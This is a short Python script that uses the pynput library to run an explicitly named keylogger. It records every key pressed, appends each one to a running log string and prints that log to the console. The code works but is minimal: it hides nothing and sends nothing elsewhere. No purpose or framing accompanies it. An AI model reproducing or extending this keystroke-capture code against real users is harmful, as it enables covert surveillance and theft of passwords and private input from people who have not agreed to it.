import pynput.keyboard

log = ""

def callback_function(key):
    global log
    log = log + str(key)
    print(log)
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()